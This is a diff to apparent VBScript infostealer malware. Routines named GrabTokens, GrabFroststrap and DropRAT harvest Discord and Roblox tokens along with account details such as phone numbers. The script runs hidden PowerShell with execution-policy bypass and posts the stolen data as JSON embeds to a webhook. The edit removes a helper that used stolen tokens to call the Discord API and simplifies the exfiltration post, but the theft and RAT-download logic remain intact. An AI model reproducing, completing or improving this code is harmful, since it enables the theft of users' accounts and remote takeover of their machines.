@@ -146,23 +146,6 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- Helper to get Discord Avatar ---
-Function GetDiscordAvatar(token)
-    GetDiscordAvatar = ""
-    Dim psCmd
-    psCmd = "$h=@{Authorization='" & token & "'};try{$r=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $h -TimeoutSec 5 -ErrorAction Stop;if($r.avatar){$ext='png';if($r.avatar.StartsWith('a_')){$ext='gif'};Write-Output ('https://cdn.discordapp.com/avatars/'+$r.id+'/'+$r.avatar+'.'+$ext)}}catch{}"
-    
-    Dim tmpFile: tmpFile = TmpFile("dc_av.txt")
-    fso.DeleteFile tmpFile, True
-    
-    sh.Run "powershell -NoP -Exec Bypass -Command """ & psCmd & " | Out-File -FilePath '" & tmpFile & "' -Encoding ascii -NoNewline""", 0, True
-    
-    If fso.FileExists(tmpFile) Then
-        GetDiscordAvatar = ReadFile(tmpFile)
-        fso.DeleteFile tmpFile, True
-    End If
-End Function
-
 ' --- DropRAT ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
@@ -264,9 +247,7 @@ Sub GrabTokens()
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
-                        
-                        Dim avUrlDc: avUrlDc = GetDiscordAvatar(p(4))
-                        Call PostEmbedWithThumb(":crown: Discord Token Profile", info, 5793266, avUrlDc)
+                        Call PostEmbed(":gift: Discord Token", info, 5793266)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
@@ -286,22 +267,6 @@ Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1)
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "application/json"
-    h.Send j
-    Set h = Nothing
-End Sub
-
-' --- PostEmbed with Thumbnail ---
-Sub PostEmbedWithThumb(t, d, c, imgUrl)
-    Dim DQ: DQ = Chr(34)
-    Dim thumbStr: thumbStr = ""
-    If Len(imgUrl) > 0 Then
-        thumbStr = "," & DQ & "thumbnail" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & Ej(imgUrl) & DQ & "}"
-    End If
-    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & thumbStr & "}]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
